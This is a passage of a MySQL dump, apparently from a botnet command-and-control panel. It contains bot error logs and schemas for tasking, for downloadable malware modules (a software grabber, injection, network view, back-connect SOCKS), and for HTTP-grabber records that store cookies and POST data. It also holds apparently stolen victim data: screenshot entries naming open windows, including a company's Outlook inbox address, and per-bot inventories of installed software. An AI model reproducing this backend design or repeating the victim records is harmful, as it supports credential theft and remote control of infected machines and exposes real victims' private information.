require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:04:56'),
(229, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:04:58'),
(230, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:04:59'),
(231, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:05:45'),
(232, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 12:37:04'),
(233, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 14:30:36');
INSERT INTO `logs` (`id`, `controller`, `function`, `log`, `error_time`) VALUES
(234, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 17:36:47');

-- --------------------------------------------------------

--
-- Структура таблицы `main_tasks`
--

CREATE TABLE `main_tasks` (
  `id` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  `os` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `country` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `bot_ids` text COLLATE utf8mb4_unicode_520_ci,
  `flows` text COLLATE utf8mb4_unicode_520_ci,
  `domain_names` text COLLATE utf8mb4_unicode_520_ci,
  `bots` int(11) NOT NULL,
  `bots_with_task` int(11) NOT NULL DEFAULT '0',
  `cpu` varchar(191) COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `sid` int(11) NOT NULL DEFAULT '0',
  `method_type` smallint(3) NOT NULL,
  `context` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `flags` int(11) NOT NULL DEFAULT '0',
  `status` smallint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `modules`
--

CREATE TABLE `modules` (
  `id` int(11) NOT NULL,
  `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `hash_x32` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `hash_x64` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `url_x32` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `url_x64` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `path_x32` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `path_x64` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `context` mediumtext COLLATE utf8mb4_unicode_520_ci,
  `status` smallint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `modules`
--

INSERT INTO `modules` (`id`, `name`, `hash_x32`, `hash_x64`, `url_x32`, `url_x64`, `path_x32`, `path_x64`, `context`, `status`) VALUES
(4, 'softwaregrabber', 'ftp_hash_x32', 'f39978c3c82a9f71def086f823b96f6b', '2ff1098d573fdb74ba5b2f6030209a88', 'http://example.com/ftp_module_x64.dll', 'sgrab32.dll', 'sgrab.dll', NULL, 1),
(5, 'sninj', '111', '56322b70f654b9469cfee704fb88937d', '111', '111', '111', 'sninj64.dll', '0', 2),
(7, 'netview', 'socks_hash_x32', '2f18e8bc4d80b74835dd60c024399319', '18163de8e95d8763b826337b070bc98a', 'http://example.com/socks_module_x64.dll', 'netview32.dll', 'netview64.dll', NULL, 1),
(21, 'backsocks', '0', '798235e70c5949c17fda880030f6d427', '0', '0', '0', 'backsocks.dll', NULL, 1);

-- --------------------------------------------------------

--
-- Структура таблицы `plogs`
--

CREATE TABLE `plogs` (
  `id` int(255) NOT NULL,
  `username` varchar(50) COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `ipaddress` varchar(75) COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `action` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `date` int(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `reports_antivirus`
--

CREATE TABLE `reports_antivirus` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `reports_firewall`
--

CREATE TABLE `reports_firewall` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `reports_http_grabber`
--

CREATE TABLE `reports_http_grabber` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `url` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `useragent` text COLLATE utf8mb4_unicode_520_ci,
  `content_type` text COLLATE utf8mb4_unicode_520_ci,
  `accept_encoding` text COLLATE utf8mb4_unicode_520_ci,
  `accept_language` text COLLATE utf8mb4_unicode_520_ci,
  `referer` text COLLATE utf8mb4_unicode_520_ci,
  `cookie` text COLLATE utf8mb4_unicode_520_ci,
  `post_data` text COLLATE utf8mb4_unicode_520_ci,
  `flags` int(11) DEFAULT NULL,
  `insert_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `reports_netview_info`
--

CREATE TABLE `reports_netview_info` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `domain_name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `domain_role` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `extended_name` mediumtext COLLATE utf8mb4_unicode_520_ci,
  `network_shares` mediumtext COLLATE utf8mb4_unicode_520_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `reports_netview_info`
--

INSERT INTO `reports_netview_info` (`id`, `bot_id`, `domain_name`, `domain_role`, `extended_name`, `network_shares`) VALUES
(1, 34, 'WORKGROUP', '0', 'dev-pc\\dev', '\\\\VBOXSVR\\share2|\\\\VBOXSVR\\shared|');

-- --------------------------------------------------------

--
-- Структура таблицы `reports_netview_info_clients`
--

CREATE TABLE `reports_netview_info_clients` (
  `id` int(11) NOT NULL,
  `reports_netview_info_id` int(11) NOT NULL,
  `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `type` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `platform` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `comment` mediumtext COLLATE utf8mb4_unicode_520_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `reports_screenshots`
--

CREATE TABLE `reports_screenshots` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `path` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `path_thumbnail` mediumtext COLLATE utf8mb4_unicode_520_ci,
  `description` mediumtext COLLATE utf8mb4_unicode_520_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `reports_screenshots`
--

INSERT INTO `reports_screenshots` (`id`, `bot_id`, `path`, `path_thumbnail`, `description`) VALUES
(34, 25, 'files/bots/068619D606E4FF8EB545/screenshots/screenshot_1603089505572.jpeg', NULL, 'Window name: Windows é»˜è®¤é”å±ç•Œé¢ | Process name: LockApp.exe | Process id: 11236'),
(35, 30, 'files/bots/7D253669EAE49BC22426/screenshots/screenshot_1603091826799.jpeg', NULL, 'Window name: Inbox - info@esnaadgroup.ae - Outlook | Process name: OUTLOOK.EXE | Process id: 35560'),
(36, 28, 'files/bots/DD04D65EF3A9450EA707/screenshots/screenshot_1603091884809.jpeg', NULL, 'Window name: à¸™à¸²à¸¡à¸šà¸±à¸•à¸£ à¸Ÿà¸£à¸µ - Excel | Process name: EXCEL.EXE | Process id: 9656'),
(37, 31, 'files/bots/11B2AF715286F6C136DB/screenshots/screenshot_1603091899491.jpeg', NULL, 'Window name: Counter-Strike: Global Offensive | Process name: csgo.exe | Process id: 1588'),
(38, 32, 'files/bots/C46478A12BAA45033A87/screenshots/screenshot_1603091937005.jpeg', NULL, 'Window name: (460) MARATONA TÃ´ de GraÃ§a | NOVA TEMPORADA 15H | TÃ´ de GraÃ§a - YouTube - Google Chrome | Process name: chrome.exe | Process id: 4616'),
(39, 25, 'files/bots/068619D606E4FF8EB545/screenshots/screenshot_1603091968569.jpeg', NULL, 'Window name: 192.168.80.5 - è¿œç¨‹æ¡Œé¢è¿žæŽ¥ | Process name: mstsc.exe | Process id: 13108'),
(40, 26, 'files/bots/5A91C76F3848D348633F/screenshots/screenshot_1603091976754.jpeg', NULL, 'Window name:  | Process name: explorer.exe | Process id: 6140'),
(41, 33, 'files/bots/AEEF2325FA54CE824D94/screenshots/screenshot_1603091981193.jpeg', NULL, 'Window name: Adobe After Effects 2020 - My TV Broadcast Package (converted).aep * | Process name: AfterFX.exe | Process id: 5404');

-- --------------------------------------------------------

--
-- Структура таблицы `reports_software`
--

CREATE TABLE `reports_software` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `name` mediumtext COLLATE utf8mb4_unicode_520_ci,
  `vendor` mediumtext COLLATE utf8mb4_unicode_520_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `reports_software`
--

INSERT INTO `reports_software` (`id`, `bot_id`, `name`, `vendor`) VALUES
(206, 33, 'AMD Software', 'Unknown'),
(207, 33, 'Magic Bullet Suite', 'Red Giant LLC'),
(208, 33, 'Maxon Cinema 4D R21', 'Maxon'),
(209, 33, 'Microsoft Visual Studio 2010 Tools for Office Runtime (x64)', 'Microsoft Corporation'),
(210, 33, 'Mozilla Firefox 81.0.2 (x64 en-US)', 'Mozilla'),
(211, 33, 'Mozilla Maintenance Service', 'Mozilla'),
(212, 33, 'VLC media player', 'VideoLAN'),
(213, 33, 'WinRAR 5.91 (64-bit)', 'win.rar GmbH'),
(214, 33, 'Microsoft Visual C++ 2005 Redistributable (x64)', 'Microsoft Corporation'),
(215, 33, 'AMD User Experience Program Installer', 'Advanced Micro Devices, Inc.'),
(216, 33, 'Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219', 'Microsoft Corporation'),
(217, 33, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030', 'Microsoft Corporation'),
(218, 33, 'Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40660', 'Microsoft Corporation'),
(219, 33, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161', 'Microsoft Corporation'),
(220, 33, 'Update for Windows 10 for x64-based Systems (KB4023057)', 'Microsoft Corporation'),
(221, 33, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17', 'Microsoft Corporation'),
(222, 33, 'Branding64', 'Unknown'),
(223, 33, 'Microsoft Office Office 64-bit Components 2010', 'Microsoft Corporation'),
(224, 33, 'Microsoft Office Shared 64-bit MUI (English) 2010', 'Microsoft Corporation'),
(225, 33, 'Microsoft Office Shared 64-bit Setup Metadata MUI (English) 2010', 'Microsoft Corporation'),
(226, 33, 'Microsoft Visual C++ 2019 X64 Additional Runtime - 14.23.27820', 'Microsoft Corporation'),
(227, 33, 'Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.23.27820', 'Microsoft Corporation'),
(228, 33, 'Update for Windows 10 for x64-based Systems (KB4480730)', 'Microsoft Corporation'),
(229, 33, 'Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40660', 'Microsoft Corporation'),
(230, 33, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030', 'Microsoft Corporation'),
(231, 33, 'AMD Settings', 'Unknown'),
(232, 33, 'UpdateAssistant', 'Unknown'),
(233, 25, '7-Zip 18.05 (x64)', 'Igor Pavlov'),
(234, 25, 'Mozilla Firefox 79.0 (x64 zh-CN)', 'Mozilla'),
(235, 25, 'Mozilla Maintenance Service', 'Mozilla'),
(236, 25, 'Microsoft Office Standard 2013', 'Microsoft Corporation'),
(237, 25, 'Skype for Business Basic 2016', 'Microsoft Corporation'),
(238, 25, 'OpenVPN 2.4.6-I602 ', 'Unknown'),
(239, 25, 'TAP-Windows 9.21.2', 'Unknown'),
(240, 25, 'WinRAR 5.80 (64-bit)', 'win.rar GmbH'),
(241, 25, 'Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.22.27821', 'Microsoft Corporation'),
(242, 25, 'iTunes', 'Unknown'),
(243, 25, 'Dell Power Manager Service', 'Dell Inc.'),
(244, 25, 'VMware Horizon 7 Persona Management', 'VMware, Inc.'),
(245, 25, 'Intel(R) OEM Extension', 'Intel Corporation'),
(246, 25, 'Intel(R) Chipset Device Software', 'Intel Corporation'),
(247, 25, 'Intel(R) Management Engine Components', 'Intel Corporation'),
(248, 25, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.60610', 'Microsoft Corporation'),
(249, 25, 'VNC Viewer 6.19.1115', 'RealVNC Ltd'),
(250, 25, 'PuTTY release 0.73 (64-bit)', 'Simon Tatham'),
(251, 25, 'Intel(R) Icls', 'Unknown'),
(252, 25, 'VMware Horizon HTML5 Multimedia Redirection Client', 'VMware, Inc.'),
(253, 25, 'Dell Command | Update for Windows 10', 'Dell, Inc.'),
(254, 25, 'Bonjour', 'Unknown'),
(255, 25, 'Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40660', 'Microsoft Corporation'),
(256, 25, 'TortoiseSVN 1.8.12.26645 (64 bit)', 'TortoiseSVN'),
(257, 25, 'Intel(R) Management Engine Driver', 'Intel Corporation'),
(258, 25, 'Microsoft Policy Platform', 'Microsoft Corporation'),
(259, 25, 'Microsoft Visual C++ 2019 X64 Additional Runtime - 14.22.27821', 'Microsoft Corporation'),
(260, 25, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.60610', 'Microsoft Corporation'),
(261, 25, 'Intel(R) LMS', 'Unknown'),
(262, 25, 'VMware Horizon Client', 'VMware, Inc.'),
(263, 25, 'Tendaæ— çº¿ç½‘å¡', 'Tenda'),
(264, 25, 'Microsoft Excel MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(265, 25, 'Microsoft PowerPoint MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(266, 25, 'Microsoft Publisher MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(267, 25, 'Microsoft Outlook MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(268, 25, 'Microsoft Word MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(269, 25, 'Microsoft Office Proofing Tools 2013 - English', 'Microsoft Corporation'),
(270, 25, 'Microsoft Office æ ¡å¯¹å·¥å…· 2013 - ç®€ä½“ä¸­æ–‡', 'Microsoft Corporation'),
(271, 25, 'Microsoft Office Proofing (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(272, 25, 'Microsoft Office Shared MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(273, 25, 'Microsoft OneNote MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(274, 25, 'Microsoft Groove MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(275, 25, 'Microsoft Office 32-bit Components 2013', 'Microsoft Corporation'),
(276, 25, 'Microsoft Office Shared 32-bit MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(277, 25, 'Microsoft Office OSM MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(278, 25, 'Microsoft Office OSM UX MUI (Chinese (Simplified)) 2013', 'Microsoft Corporation'),
(279, 25, 'Microsoft Office Proofing Tools 2016 - English', 'Microsoft Corporation'),
(280, 25, 'Microsoft Office æ ¡å¯¹å·¥å…· 2016 - ç®€ä½“ä¸­æ–‡', 'Microsoft Corporation'),
(281, 25, 'Microsoft Office Proofing (Chinese (Simplified)) 2016', 'Microsoft Corporation'),
(282, 25, 'Microsoft Office Shared MUI (Chinese (Simplified)) 2016', 'Microsoft Corporation'),
(283, 25, 'Microsoft Office 32-bit Components 2016', 'Microsoft Corporation'),
(284, 25, 'Microsoft Office Shared 32-bit MUI (Chinese (Simplified)) 2016', 'Microsoft Corporation'),
(285, 25, 'Microsoft Skype for Business MUI (Chinese (Simplified)) 2016', 'Microsoft Corporation'),
(286, 25, 'Microsoft Skype for Business Entry 2016', 'Microsoft Corporation'),
(287, 25, 'Dynamic Application Loader Host Interface Service', 'Intel Corporation'),
(288, 25, 'Microsoft VC++ redistributables repacked.', 'Intel Corporation'),
(289, 25, 'Configuration Manager Client', 'Microsoft Corporation'),
(290, 25, 'Apple Mobile Device Support', 'Apple Inc.'),
(291, 25, 'Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40660', 'Microsoft Corporation'),
(292, 25, 'Dell SupportAssist', 'Dell Inc.'),
(293, 25, 'Apple åº”ç”¨ç¨‹åºæ”¯æŒ (64 ä½)', 'Apple Inc.'),
(294, 25, 'VMware Horizon Media Engine 8.0.0.561 (64-bit)', 'VMware, Inc.'),
(295, 25, '64 Bit HP CIO Components Installer', 'Hewlett-Packard'),
(296, 26, 'Streamlabs OBS', 'Unknown'),
(297, 26, 'BlueStacks App Player', 'Unknown'),
(298, 26, 'CPUID CPU-Z 1.71.1', 'Unknown'),
(299, 26, 'DAEMON Tools Lite', 'Disc Soft Ltd'),
(300, 26, 'Genshin Impact', 'miHoYo Co.,Ltd'),
(301, 26, 'Riot Vanguard', 'Unknown'),
(302, 26, 'Path of Exile', 'Unknown'),
(303, 26, 'Resident Evil 4', 'Capcom'),
(304, 26, 'Alien Swarm: Reactive Drop', 'Reactive Drop Team'),
(305, 26, 'WinRAR 5.70 (64-bit)', 'win.rar GmbH'),
(306, 26, 'Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219', 'Microsoft Corporation'),
(307, 26, 'Java 8 Update 211 (64-bit)', 'Oracle Corporation'),
(308, 26, 'Java 8 Update 241 (64-bit)', 'Oracle Corporation'),
(309, 26, 'Java 8 Update 251 (64-bit)', 'Oracle Corporation'),
(310, 26, 'MPC-HC 1.7.13 (64-bit)', 'MPC-HC Team'),
(311, 26, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030', 'Microsoft Corporation'),
(312, 26, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.4148', 'Microsoft Corporation'),
(313, 26, 'Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40660', 'Microsoft Corporation'),
(314, 26, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17', 'Microsoft Corporation'),
(315, 26, 'Microsoft Update Health Tools', 'Microsoft Corporation'),
(316, 26, 'NVIDIA Driver de grÃ¡ficos 456.71', 'NVIDIA Corporation'),
(317, 26, 'NVIDIA GeForce Experience 3.20.4.14', 'NVIDIA Corporation'),
(318, 26, 'NVIDIA Optimus Update 38.0.5.0', 'NVIDIA Corporation'),
(319, 26, 'NVIDIA Software do sistema PhysX 9.19.0218', 'NVIDIA Corporation'),
(320, 26, 'AtualizaÃ§Ãµes da NVIDIA 38.0.5.0', 'NVIDIA Corporation'),
(321, 26, 'NVIDIA SHIELD Streaming', 'NVIDIA Corporation'),
(322, 26, 'NVIDIA Driver de Ã¡udio HD 1.3.38.35', 'NVIDIA Corporation'),
(323, 26, 'NVIDIA Install Application', 'NVIDIA Corporation'),
(324, 26, 'NVIDIA ABHub', 'Unknown'),
(325, 26, 'NVIDIA Backend', 'Unknown'),
(326, 26, 'NVIDIA Container', 'Unknown'),
(327, 26, 'NVIDIA TelemetryApi helper for NvContainer', 'NVIDIA Corporation'),
(328, 26, 'NVIDIA LocalSystem Container', 'NVIDIA Corporation'),
(329, 26, 'NVIDIA Message Bus for NvContainer', 'NVIDIA Corporation'),
(330, 26, 'NVAPI Monitor plugin for NvContainer', 'NVIDIA Corporation'),
(331, 26, 'NVIDIA NetworkService Container', 'NVIDIA Corporation'),
(332, 26, 'NVIDIA Session Container', 'NVIDIA Corporation'),
(333, 26, 'NVIDIA User Container', 'NVIDIA Corporation'),
(334, 26, 'NvModuleTracker', 'Unknown'),
(335, 26, 'NVIDIA NodeJS', 'Unknown'),
(336, 26, 'NVIDIA Watchdog Plugin for NvContainer', 'NVIDIA Corporation'),
(337, 26, 'NVIDIA Telemetry Client', 'NVIDIA Corporation'),
(338, 26, 'NVIDIA Virtual Host Controller', 'NVIDIA Corporation'),
(339, 26, 'Nvidia Share', 'Unknown'),
(340, 26, 'NVIDIA ShadowPlay 3.20.4.14', 'NVIDIA Corporation'),
(341, 26, 'NVIDIA SHIELD Wireless Controller Driver', 'NVIDIA Corporation'),
(342, 26, 'NVIDIA Update Core', 'NVIDIA Corporation'),
(343, 26, 'NVIDIA Virtual Audio 4.13.0.0', 'NVIDIA Corporation'),
(344, 26, 'Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40660', 'Microsoft Corporation'),
(345, 26, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030', 'Microsoft Corporation'),
(346, 26, 'Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.27.29016', 'Microsoft Corporation'),
(347, 26, 'Microsoft Visual C++ 2019 X64 Additional Runtime - 14.27.29016', 'Microsoft Corporation'),
(348, 26, 'Epic Games Launcher Prerequisites (x64)', 'Epic Games, Inc.'),
(349, 27, 'Pacote de Driver do Windows - Intel(R) Corporation (IntcDAud) MEDIA  (04/26/2018 6.16.0.3208)', 'Intel(R) Corporation'),
(350, 27, 'Pacote de Driver do Windows - Intel (MEIx64) System  (03/28/2016 11.0.5.1189)', 'Intel'),
(351, 27, 'Pacote de Driver do Windows - Realtek Semiconductor Corp. Net  (01/24/2015 2023.2.1215.2014)', 'Realtek Semiconductor Corp.'),
(352, 27, 'Pacote de Driver do Windows - Qualcomm Atheros (L1C) Net  (09/09/2016 2.1.0.26)', 'Qualcomm Atheros'),
(353, 27, 'CCleaner', 'Piriform'),
(354, 27, 'Macrium Reflect Free Edition', 'Paramount Software (UK) Ltd.'),
(355, 27, 'Microsoft Office Professional Plus 2016 - en-us', 'Microsoft Corporation'),
(356, 27, 'Synaptics Pointing Device Driver', 'Synaptics Incorporated'),
(357, 27, 'CorelDRAW Graphics Suite 2018 (64-Bit)', 'Corel Corporation'),
(358, 27, 'Corel Graphics - Windows Shell Extension', 'Corel Corporation'),
(359, 27, 'Intel(R) Chipset Device Software', 'Intel Corporation'),
(360, 27, 'CorelDRAW Graphics Suite 2018 - Custom Data (x64)', 'Corel Corporation'),
(361, 27, 'LG Power Manager', 'Unknown'),
(362, 27, 'Microsoft Visual Studio Tools for Applications 2017 x64 Hosting Support', 'Microsoft Corporation'),
(363, 27, 'CorelDRAW Graphics Suite 2018 - Draw (x64)', 'Corel Corporation'),
(364, 27, 'Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219', 'Microsoft Corporation'),
(365, 27, 'Warsaw 2.14.1.3 64 bits', 'Diebold Nixdorf'),
(366, 27, 'Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810', 'Microsoft Corporation'),
(367, 27, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030', 'Microsoft Corporation'),
(368, 27, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.4148', 'Microsoft Corporation'),
(369, 27, 'CorelDRAW Graphics Suite 2018 - BR (x64)', 'Corel Corporation'),
(370, 27, 'CorelDRAW Graphics Suite 2018 - Capture (x64)', 'Corel Corporation'),
(371, 27, 'CorelDRAW Graphics Suite 2018', 'Corel Corporation'),
